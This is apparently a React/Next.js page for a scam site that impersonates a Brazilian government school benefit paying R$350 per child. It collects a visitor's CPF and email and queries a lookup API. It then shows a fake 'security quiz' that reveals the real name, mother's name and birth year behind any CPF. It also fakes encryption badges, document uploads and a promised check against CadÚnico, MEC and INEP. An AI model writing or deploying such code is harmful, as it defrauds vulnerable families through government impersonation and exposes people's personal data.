"use client";

import { GovHeader } from "@/components/GovHeader";
import { useState } from "react";
import { useRouter } from "next/navigation";
import { ArrowRight, Check, Loader2, User, FileText, School, Upload, X, ShieldCheck, AlertCircle, Lock, Mail } from "lucide-react";

// Types for API Response
interface UserData {
    cpf: string;
    nome: string;
    sexo: string;
    nascimento: string;
    nome_mae: string;
}

// Utility to generate fake names
const generateFakeNames = (correctName: string, type: 'name' | 'mother') => {
    const firstNames = ["Maria", "Ana", "Francisca", "Antônia", "Adriana", "Juliana", "Márcia", "Fernanda", "Patrícia", "Aline"];
    const middleNames = ["Silva", "Santos", "Oliveira", "Souza", "Rodrigues", "Ferreira", "Alves", "Pereira", "Lima", "Gomes"];
    const lastNames = ["Costa", "Ribeiro", "Martins", "Carvalho", "Almeida", "Lopes", "Soares", "Fernandes", "Vieira", "Barbosa"];

    const fakes: string[] = [];
    while (fakes.length < 2) {
        const fake = `${firstNames[Math.floor(Math.random() * firstNames.length)]} ${middleNames[Math.floor(Math.random() * middleNames.length)]} ${lastNames[Math.floor(Math.random() * lastNames.length)]}`;
        if (fake !== correctName && !fakes.includes(fake)) {
            fakes.push(fake);
        }
    }
    return [correctName, ...fakes].sort(() => Math.random() - 0.5);
};

// Utility to generate fake years
const generateFakeYears = (correctYear: number) => {
    const fakes: number[] = [];
    while (fakes.length < 2) {
        const offset = Math.floor(Math.random() * 5) + 1; // 1 to 5 years difference
        const sign = Math.random() > 0.5 ? 1 : -1;
        const fake = correctYear + (offset * sign);
        if (fake !== correctYear && !fakes.includes(fake)) {
            fakes.push(fake);
        }
    }
    return [correctYear, ...fakes].sort(() => Math.random() - 0.5);
};

// Utility to generate fake ages
const generateFakeAges = (correctAge: number) => {
    const fakes: number[] = [];
    while (fakes.length < 2) {
        const offset = Math.floor(Math.random() * 4) + 1; // 1 to 4 years difference
        const sign = Math.random() > 0.5 ? 1 : -1;
        const fake = correctAge + (offset * sign);
        if (fake !== correctAge && !fakes.includes(fake)) {
            fakes.push(fake);
        }
    }
    return [correctAge, ...fakes].sort(() => Math.random() - 0.5);
};


export default function SolicitarPage() {
    const [step, setStep] = useState(1);
    const [loading, setLoading] = useState(false);
    const [numFilhos, setNumFilhos] = useState(1);
    const [uploadedDocs, setUploadedDocs] = useState<{ [key: string]: string }>({});

    // Quiz State
    const [cpfInput, setCpfInput] = useState("");
    const [emailInput, setEmailInput] = useState("");
    const [userData, setUserData] = useState<UserData | null>(null);
    const [quizStep, setQuizStep] = useState(0); // 0: CPF, 1: Name, 2: Mother/Age, 3: Birth Year
    const [quizOptions, setQuizOptions] = useState<(string | number)[]>([]);
    const [quizError, setQuizError] = useState("");
    const [selectedOption, setSelectedOption] = useState<string | number | null>(null);

    const handleFileUpload = (docType: string, fileName: string) => {
        setUploadedDocs(prev => ({ ...prev, [docType]: fileName }));
    };

    const fetchUserData = async () => {
        if (cpfInput.length < 11) return;
        setLoading(true);
        setQuizError("");

        try {
            const res = await fetch(`/api/validate-cpf?cpf=${cpfInput}`);
            const data = await res.json();

            if (data.success && data.data) {
                setUserData(data.data);
                prepareNameQuiz(data.data.nome);
            } else {
                setQuizError("CPF não encontrado. Verifique se digitou corretamente.");
            }
        } catch (error) {
            setQuizError("Erro de comunicação. Tente novamente.");
        } finally {
            setLoading(false);
        }
    };

    const prepareNameQuiz = (correctName: string) => {
        setQuizOptions(generateFakeNames(correctName, 'name'));
        setQuizStep(1);
    };

    const prepareMotherQuiz = () => {
        if (userData?.nome_mae) {
            setQuizOptions(generateFakeNames(userData.nome_mae, 'mother'));
            setQuizStep(2);
        } else {
            // Fallback to Age if mother's name is missing
            const birthYear = parseInt(userData!.nascimento.split('/')[2]);
            const currentYear = new Date().getFullYear();
            const age = currentYear - birthYear;
            setQuizOptions(generateFakeAges(age));
            setQuizStep(2); // Using step 2 for age as well logic-wise
        }
    };

    const prepareBirthQuiz = () => {
        const birthYear = parseInt(userData!.nascimento.split('/')[2]);
        setQuizOptions(generateFakeYears(birthYear));
        setQuizStep(3);
    };

    const handleQuizAnswer = (answer: string | number) => {
        setSelectedOption(answer);
        setLoading(true);
        setQuizError("");

        // Simulate "Validating" delay
        setTimeout(() => {
            let isCorrect = false;

            if (quizStep === 1) { // Name Check
                isCorrect = answer === userData?.nome;
                if (isCorrect) {
                    prepareMotherQuiz();
                }
            } else if (quizStep === 2) { // Mother or Age Check
                if (userData?.nome_mae) {
                    isCorrect = answer === userData.nome_mae;
                } else {
                    const birthYear = parseInt(userData!.nascimento.split('/')[2]);
                    const currentYear = new Date().getFullYear();
                    const age = currentYear - birthYear;
                    isCorrect = answer === age;
                }

                if (isCorrect) {
                    prepareBirthQuiz();
                }
            } else if (quizStep === 3) { // Birth Year Check
                const birthYear = parseInt(userData!.nascimento.split('/')[2]);
                isCorrect = answer === birthYear;
                if (isCorrect) {
                    setStep(2); // Success! Move to dependent step
                }
            }

            if (!isCorrect) {
                setQuizError("Resposta incorreta. Por motivos de segurança, verifique seus dados.");
                setSelectedOption(null); // Reset selection on error
            } else {
                setSelectedOption(null); // Reset selection on success
            }

            setLoading(false);
        }, 800);
    };

    const router = useRouter();

    const handleNext = () => {
        setLoading(true);
        setTimeout(() => {
            setLoading(false);
            if (step < 4) setStep(step + 1);
            else {
                const params = new URLSearchParams();
                if (userData?.nome) params.set('nome', userData.nome);
                if (emailInput) params.set('email', emailInput);
                const limitValue = (numFilhos * 350).toFixed(2);
                params.set('limit', limitValue);
                router.push(`/analise?${params.toString()}`);
            }
        }, 1500);
    };

    // Helper functions for masking
    const maskCPF = (v: string) => {
        v = v.replace(/\D/g, "");
        if (v.length > 11) v = v.slice(0, 11);

        return v
            .replace(/(\d{3})(\d)/, "$1.$2")
            .replace(/(\d{3})(\d)/, "$1.$2")
            .replace(/(\d{3})(\d{1,2})$/, "$1-$2");
    };

    return (
        <div className="min-h-screen bg-slate-50 flex flex-col">
            <GovHeader />

            <main className="flex-1 container-centered py-12">
                <div className="max-w-2xl mx-auto">
                    {/* Progress Bar */}
                    <div className="mb-8">
                        <div className="flex justify-between mb-2">
                            <span className={`text-sm font-bold ${step >= 1 ? 'text-gov-blue-800' : 'text-gray-400'}`}>Dados Pessoais</span>
                            <span className={`text-sm font-bold ${step >= 2 ? 'text-gov-blue-800' : 'text-gray-400'}`}>Dependentes</span>
                            <span className={`text-sm font-bold ${step >= 3 ? 'text-gov-blue-800' : 'text-gray-400'}`}>Documentos</span>
                            <span className={`text-sm font-bold ${step >= 4 ? 'text-gov-blue-800' : 'text-gray-400'}`}>Análise</span>
                        </div>
                        <div className="h-2 bg-gray-200 rounded-full overflow-hidden">
                            <div
                                className="h-full bg-gov-green-600 transition-all duration-500 ease-out"
                                style={{ width: `${(step / 4) * 100}%` }}
                            ></div>
                        </div>
                    </div>

                    <div className="bg-white rounded-2xl shadow-lg border border-slate-100 overflow-hidden">
                        <div className="p-8">
                            {/* STEP 1: IDENTITY VALIDATION QUIZ */}
                            {step === 1 && (
                                <div className="space-y-6 animate-in fade-in slide-in-from-bottom-4 duration-500">
                                    <div className="flex items-center gap-3 mb-6">
                                        <div className="bg-blue-100 p-3 rounded-full text-gov-blue-800">
                                            <ShieldCheck className="h-6 w-6" />
                                        </div>
                                        <div>
                                            <h2 className="text-2xl font-bold text-slate-900">
                                                {quizStep === 0 ? "Consulta de Elegibilidade" : "Confirmação de Segurança"}
                                            </h2>
                                            {quizStep === 0 && <p className="text-sm text-slate-500">Informe seu CPF para verificar a disponibilidade do benefício</p>}
                                        </div>
                                    </div>

                                    {quizError && (
                                        <div className="bg-red-50 border border-red-200 p-4 rounded-lg flex items-start gap-3 text-red-700">
                                            <AlertCircle className="h-5 w-5 flex-shrink-0 mt-0.5" />
                                            <p className="text-sm font-medium">{quizError}</p>
                                        </div>
                                    )}

                                    {/* QUIZ STEP 0: CPF Input */}
                                    {quizStep === 0 && (
                                        <div className="space-y-6">
                                            <div className="bg-slate-50 p-6 rounded-xl border border-slate-200 space-y-4">
                                                <div>
                                                    <label className="block text-sm font-bold text-slate-700 mb-2">CPF do Responsável</label>
                                                    <div className="relative">
                                                        <input
                                                            type="text"
                                                            placeholder="000.000.000-00"
                                                            className="w-full p-4 pl-12 border border-slate-300 rounded-lg focus:ring-2 focus:ring-gov-blue-700 outline-none text-xl tracking-widest font-mono text-slate-900"
                                                            value={maskCPF(cpfInput)}
                                                            onChange={(e) => setCpfInput(e.target.value.replace(/\D/g, ""))}
                                                            maxLength={14}
                                                        />
                                                        <User className="absolute left-4 top-1/2 transform -translate-y-1/2 text-slate-400 h-6 w-6" />
                                                    </div>
                                                </div>

                                                <div>
                                                    <label className="block text-sm font-bold text-slate-700 mb-2">E-mail para Contato</label>
                                                    <div className="relative">
                                                        <input
                                                            type="email"
                                                            placeholder="seu@email.com"
                                                            className="w-full p-4 pl-12 border border-slate-300 rounded-lg focus:ring-2 focus:ring-gov-blue-700 outline-none text-lg text-slate-900"
                                                            value={emailInput}
                                                            onChange={(e) => setEmailInput(e.target.value)}
                                                        />
                                                        <Mail className="absolute left-4 top-1/2 transform -translate-y-1/2 text-slate-400 h-6 w-6" />
                                                    </div>
                                                </div>
                                            </div>

                                            <div className="flex items-center gap-2 mt-3 text-xs text-slate-500 justify-center">
                                                <div className="flex items-center gap-1 text-green-700 bg-green-50 px-2 py-1 rounded">
                                                    <Lock className="h-3 w-3" />
                                                    <span className="font-semibold">AES-256</span>
                                                </div>
                                                <div className="flex items-center gap-1 text-slate-600 bg-slate-100 px-2 py-1 rounded">
                                                    <ShieldCheck className="h-3 w-3" />
                                                    <span>Ambiente Seguro</span>
                                                </div>
                                            </div>

                                            <button
                                                onClick={fetchUserData}
                                                disabled={loading || cpfInput.length < 11 || !emailInput.includes('@')}
                                                className="w-full bg-gov-green-600 text-white px-6 py-4 rounded-lg font-bold text-lg hover:bg-gov-green-700 transition-all disabled:opacity-70 disabled:cursor-not-allowed flex justify-center items-center gap-2 shadow-md hover:shadow-lg transform active:scale-95"
                                            >
                                                {loading ? <Loader2 className="animate-spin" /> : "CONSULTAR"}
                                            </button>

                                            <div className="text-center">
                                                <p className="text-xs text-slate-400">
                                                    Seus dados são utilizados apenas para consulta de elegibilidade conforme a LGPD.
                                                </p>
                                            </div>
                                        </div>
                                    )}

                                    {/* QUIZ STEPS 1, 2, 3: Questions */}
                                    {quizStep > 0 && (
                                        <div className="space-y-6">
                                            <div className="bg-blue-50 border-l-4 border-gov-blue-600 p-4 rounded-r-lg mb-6">
                                                <p className="text-lg text-gov-blue-900 font-medium">
                                                    {quizStep === 1 && "Para sua segurança, confirme o NOME COMPLETO:"}
                                                    {quizStep === 2 && (userData?.nome_mae ? "Confirme o nome da sua MÃE:" : "Confirme sua IDADE aproximada:")}
                                                    {quizStep === 3 && "Por fim, confirme seu ANO DE NASCIMENTO:"}
                                                </p>
                                            </div>

                                            <div className="grid gap-3">
                                                {quizOptions.map((option, idx) => {
                                                    const isSelected = selectedOption === option;
                                                    return (
                                                        <button
                                                            key={idx}
                                                            onClick={() => handleQuizAnswer(option)}
                                                            disabled={loading}
                                                            className={`w-full text-left p-4 rounded-xl border-2 transition-all font-medium flex justify-between items-center group
                                                                ${isSelected
                                                                    ? 'border-gov-blue-600 bg-gov-blue-50 text-gov-blue-900 shadow-md ring-2 ring-gov-blue-200'
                                                                    : 'border-slate-300 bg-white hover:border-gov-blue-400 hover:bg-slate-50 text-slate-700'
                                                                }
                                                            `}
                                                        >
                                                            <span className="text-lg">{option}</span>
                                                            <div className={`h-7 w-7 rounded-full border-3 flex items-center justify-center transition-all flex-shrink-0
                                                                ${isSelected
                                                                    ? 'border-gov-blue-600 bg-white'
                                                                    : 'border-slate-400 bg-white group-hover:border-gov-blue-500'
                                                                }
                                                            `}>
                                                                {isSelected && <div className="h-4 w-4 bg-gov-blue-600 rounded-full" />}
                                                            </div>
                                                        </button>
                                                    );
                                                })}
                                            </div>

                                            {loading && (
                                                <div className="flex justify-center items-center gap-2 py-4 text-gov-blue-700 font-medium animate-pulse bg-gov-blue-50 rounded-lg">
                                                    <Loader2 className="animate-spin h-5 w-5" />
                                                    Validando informações de segurança...
                                                </div>
                                            )}
                                        </div>
                                    )}
                                </div>
                            )}

                            {step === 2 && (
                                <div className="space-y-6 animate-in fade-in slide-in-from-bottom-4 duration-500">
                                    <div className="flex items-center gap-3 mb-6">
                                        <div className="bg-blue-100 p-3 rounded-full text-gov-blue-800">
                                            <School className="h-6 w-6" />
                                        </div>
                                        <h2 className="text-2xl font-bold text-slate-900">Quantos filhos na escola?</h2>
                                    </div>

                                    <div className="space-y-4">
                                        <p className="text-slate-600">Informe o número de dependentes matriculados na rede pública em 2026.</p>
                                        <select
                                            className="w-full p-4 border border-slate-200 rounded-lg text-lg focus:ring-2 focus:ring-gov-blue-700 outline-none"
                                            value={numFilhos}
                                            onChange={(e) => setNumFilhos(Number(e.target.value))}
                                        >
                                            <option value={1}>1 Filho</option>
                                            <option value={2}>2 Filhos</option>
                                            <option value={3}>3 Filhos</option>
                                            <option value={4}>4 ou mais</option>
                                        </select>
                                        <div className="bg-green-50 border border-green-200 p-4 rounded-lg">
                                            <p className="text-sm text-green-800 font-medium">
                                                <strong>Valor calculado:</strong> <span className="text-xl font-bold">R$ {(numFilhos * 350).toFixed(2)}</span>
                                                <br />
                                                <span className="text-xs opacity-75">({numFilhos} {numFilhos === 1 ? 'filho' : 'filhos'} × R$ 350,00)</span>
                                            </p>
                                        </div>
                                    </div>
                                </div>
                            )}

                            {step === 3 && (
                                <div className="space-y-6 animate-in fade-in slide-in-from-bottom-4 duration-500">
                                    <div className="flex items-center gap-3 mb-6">
                                        <div className="bg-blue-100 p-3 rounded-full text-gov-blue-800">
                                            <FileText className="h-6 w-6" />
                                        </div>
                                        <h2 className="text-2xl font-bold text-slate-900">Documentação Comprobatória</h2>
                                    </div>

                                    <div className="space-y-4">
                                        <p className="text-slate-600 mb-4">Envie os documentos necessários para validação do benefício.</p>

                                        <DocumentUpload
                                            label="RG ou CNH do Responsável"
                                            docType="rg"
                                            uploaded={uploadedDocs['rg']}
                                            onUpload={handleFileUpload}
                                        />

                                        <DocumentUpload
                                            label="Comprovante de Residência (últimos 3 meses)"
                                            docType="comprovante"
                                            uploaded={uploadedDocs['comprovante']}
                                            onUpload={handleFileUpload}
                                        />

                                        {Array.from({ length: numFilhos }).map((_, i) => (
                                            <DocumentUpload
                                                key={i}
                                                label={`Certidão de Nascimento - Filho ${i + 1}`}
                                                docType={`certidao_${i}`}
                                                uploaded={uploadedDocs[`certidao_${i}`]}
                                                onUpload={handleFileUpload}
                                            />
                                        ))}

                                        <div className="bg-yellow-50 border border-yellow-200 p-4 rounded-lg mt-6">
                                            <p className="text-sm text-yellow-800">
                                                <strong>Formatos aceitos:</strong> PDF, JPG, PNG (máx. 5MB por arquivo)
                                            </p>
                                        </div>
                                    </div>
                                </div>
                            )}

                            {step === 4 && (
                                <div className="space-y-6 animate-in fade-in slide-in-from-bottom-4 duration-500 text-center py-8">
                                    <div className="mb-6 flex justify-center">
                                        <div className="h-20 w-20 bg-blue-50 rounded-full flex items-center justify-center">
                                            <FileText className="h-10 w-10 text-gov-blue-800" />
                                        </div>
                                    </div>
                                    <h2 className="text-2xl font-bold text-slate-900">Confirmar Solicitação</h2>
                                    <p className="text-slate-600 max-w-md mx-auto">
                                        Ao clicar em finalizar, seus dados serão cruzados com as bases do <strong>CadÚnico, MEC e INEP</strong> para aprovação em até 48 horas.
                                    </p>
                                    <div className="bg-slate-50 p-4 rounded-lg max-w-sm mx-auto text-left">
                                        <p className="text-xs text-slate-500 mb-2 font-semibold uppercase">Resumo da Solicitação</p>
                                        <div className="space-y-1 text-sm text-slate-700">
                                            <p className="capitalize"><strong>Nome:</strong> {userData?.nome.toLowerCase()}</p>
                                            <p>• {numFilhos} {numFilhos === 1 ? 'dependente' : 'dependentes'}</p>
                                            <p>• {Object.keys(uploadedDocs).length} documentos enviados</p>
                                            <p className="font-bold text-gov-green-700">• Valor: R$ {(numFilhos * 350).toFixed(2)}</p>
                                        </div>
                                    </div>
                                </div>
                            )}

                            <div className="mt-8 pt-6 border-t border-slate-100 flex justify-between">
                                {step > 1 && (
                                    <button
                                        onClick={() => setStep(step - 1)}
                                        className="flex items-center gap-2 text-slate-600 px-6 py-3 rounded-lg font-semibold hover:bg-slate-50 transition-colors"
                                    >
                                        Voltar
                                    </button>
                                )}
                                {step > 1 && (
                                    <button
                                        onClick={handleNext}
                                        disabled={loading}
                                        className="flex items-center gap-2 bg-gov-green-600 text-white px-8 py-4 rounded-lg font-bold hover:bg-gov-green-700 transition-all disabled:opacity-70 disabled:cursor-not-allowed ml-auto"
                                    >
                                        {loading ? (
                                            <>
                                                <Loader2 className="h-5 w-5 animate-spin" />
                                                Processando...
                                            </>
                                        ) : (
                                            <>
                                                {step === 4 ? 'Finalizar Solicitação' : 'Continuar'}
                                                <ArrowRight className="h-5 w-5" />
                                            </>
                                        )}
                                    </button>
                                )}
                            </div>
                        </div>
                    </div>
                </div>
            </main>
        </div>
    );
}

function DocumentUpload({ label, docType, uploaded, onUpload }: {
    label: string,
    docType: string,
    uploaded?: string,
    onUpload: (docType: string, fileName: string) => void
}) {
    const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
        const file = e.target.files?.[0];
        if (file) {
            onUpload(docType, file.name);
        }
    };

    return (
        <div className="border-2 border-dashed border-slate-300 rounded-lg p-4 hover:border-gov-blue-500 transition-colors">
            <label className="block text-sm font-semibold text-slate-700 mb-2">{label}</label>
            {uploaded ? (
                <div className="flex items-center justify-between bg-green-50 p-3 rounded-lg">
                    <div className="flex items-center gap-2 text-green-700">
                        <Check className="h-5 w-5" />
                        <span className="text-sm font-medium truncate">{uploaded}</span>
                    </div>
                    <button
                        onClick={() => onUpload(docType, '')}
                        className="text-red-500 hover:text-red-700"
                    >
                        <X className="h-5 w-5" />
                    </button>
                </div>
            ) : (
                <label className="flex flex-col items-center justify-center cursor-pointer py-4">
                    <Upload className="h-8 w-8 text-slate-400 mb-2" />
                    <span className="text-sm text-slate-500">Clique para enviar ou arraste o arquivo</span>
                    <input
                        type="file"
                        className="hidden"
                        accept=".pdf,.jpg,.jpeg,.png"
                        onChange={handleChange}
                    />
                </label>
            )}
        </div>
    );
}
